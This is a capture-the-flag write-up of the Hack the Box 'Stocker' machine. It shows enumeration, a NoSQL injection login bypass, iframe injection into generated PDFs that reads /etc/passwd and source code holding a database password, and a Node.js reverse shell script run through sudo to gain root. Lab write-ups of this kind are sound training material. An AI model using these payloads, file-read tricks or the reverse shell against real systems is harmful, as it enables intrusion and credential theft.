---
title: "Hack the Box - Stocker"
slug: "hack-the-box-stocker"
date: "2024-03-14"
excerpt: "Stocker is a medium difficulty Linux machine that features a website running on port 80 that advertises various house furniture. Through vHost enumeration the hostname `dev.stocker.htb` is identified and upon accessing it a login page is loaded that seems to be built with `NodeJS`. By sending JSON data and performing a `NoSQL` injection, the login page is bypassed and access to an e-shop is granted. Enumeration of this e-shop reveals that upon submitting a purchase order, a PDF is crafted that contains details about the items purchased. This functionality is vulnerable to HTML injection and can be abused to read system files through the usage of iframes. The `index.js` file is then read to acquire database credentials and owed to password re-use users can log into the system over `SSH`. Privileges can then be escalated by performing a path traversal attack on a command defined in the sudoers file, which contains a wildcard for executing `JavaScript` files."
cover: "cover.png"
tags:
  - Injection
  - Path Traversal
---

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt stocker.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

## Shell as angoose

### Website
We get a simple website on port `80`.

![](./20230620210149162.png)

If we enumerate subdomains we find `dev.stocker.htb`. Add this to `/etc/hosts`.

```shell
gobuster vhost -u stocker.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain
```

![](./20230620211333427.png)

This brings us to a login portal.

![](./20230620211513699.png)

### NoSQL Injection
We can no NoSQL injection to perform a [basic authentication login bypass](https://book.hacktricks.xyz/pentesting-web/nosql-injection).

```json
{"username": {"$ne": null}, "password": {"$ne": null} }
```

Making sure to change the `Content-Type` to `json` to match the body of our request.

![](./20230620211907820.png)

We can now login!

![](./20230620212251806.png)

If we add an item to cart we can view an automatically generated PDF.

![](./20230620212429337.png)

![](./20230620212352084.png)

### XSS
We can take advantage of the way it's generating PDF's and perform XSS. When submitting the cart, we can change the `title` parameter to include an `iframe` to test our theory.

```html
<iframe src=/etc/passwd height=1000px width=500px></iframe>
```

![](./20230620213711466.png)

If we use `/etc/passwd` we can see it's been rendered in the PDF. We can also see the username `angoose`.

![](./20230620220119222.png)

We can change our payload to include the website's back-end code to find credentials used to connect the website to a database. Because the website is using the `dev` subdomain we can assume it's in a `/dev` sub-directory on the machine.

```html
<iframe src=/var/www/dev/index.js height='1500' width='500'></iframe>
```

![](./20230620220311999.png)

If we look towards the top of the file we can see the connection string for `mongodb` which contains the credentials `IHeardPassphrasesArePrettySecure`. We can use this in conjunction with the username we just found previously.

```js
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

We can now use these credentials to get SSH on the machine and grab the `user.txt` flag.

## Privilege Escalation
If we look at the user's `sudo` permissions we see that we can run `node` as `root`.

![](./20230620220653350.png)

We can create a simple `js` script to execute shell commands. In this case we are using it to get a reverse shell.

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9001, "10.10.16.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

If we run the script from the `/usr/local/scripts` directory and use absolute paths back to our current one we can execute the script as root and get our `root.txt` flag.

![](./20230620221924595.png)